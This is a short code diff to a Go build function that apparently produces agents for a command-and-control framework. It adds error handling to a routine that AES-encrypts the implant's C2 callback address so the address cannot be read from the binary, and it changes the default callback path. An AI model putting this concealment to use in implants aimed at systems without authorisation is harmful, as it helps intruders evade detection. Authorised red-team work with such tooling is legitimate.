@@ -68,11 +68,15 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 
 	callbackURI, _ := input.BuildParameters.GetStringArg("callback_uri")
 	if callbackURI == "" {
-		callbackURI = "/"
+		callbackURI = "/data"
 	}
 
 	// Encrypt the callback address so it cannot be extracted as plaintext from the binary.
-	encryptedCallback := encryptCallback(callbackHost, aesKey)
+	encryptedCallback, err := encryptCallback(callbackHost, aesKey)
+	if err != nil {
+		resp.BuildStdErr = fmt.Sprintf("callback encryption failed: %v", err)
+		return resp
+	}
 
 	// When running inside the official Docker container the agent code lives
 	// at /Mythic/agent_code.  For local/dev runs an AGENT_CODE_DIR env var
@@ -178,17 +182,17 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 
 // encryptCallback encrypts the C2 callback address using AES-256-CBC + HMAC-SHA256,
 // matching the Mythic wire format. Output: hex(IV_16 || ciphertext || HMAC_32).
-func encryptCallback(callback string, key []byte) string {
+func encryptCallback(callback string, key []byte) (string, error) {
 	iv := make([]byte, aes.BlockSize)
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		return callback
+		return "", fmt.Errorf("failed to generate IV: %w", err)
 	}
 
 	plaintext := pkcs7Pad([]byte(callback), aes.BlockSize)
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return callback
+		return "", fmt.Errorf("failed to create AES cipher: %w", err)
 	}
 	ciphertext := make([]byte, len(plaintext))
 	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ciphertext, plaintext)
@@ -198,7 +202,7 @@ func encryptCallback(callback string, key []byte) string {
 	mac.Write(ivCt)
 	hmacBytes := mac.Sum(nil)
 
-	return hex.EncodeToString(append(ivCt, hmacBytes...))
+	return hex.EncodeToString(append(ivCt, hmacBytes...)), nil
 }
 
 // pkcs7Pad pads data to a multiple of blockSize using PKCS#7.
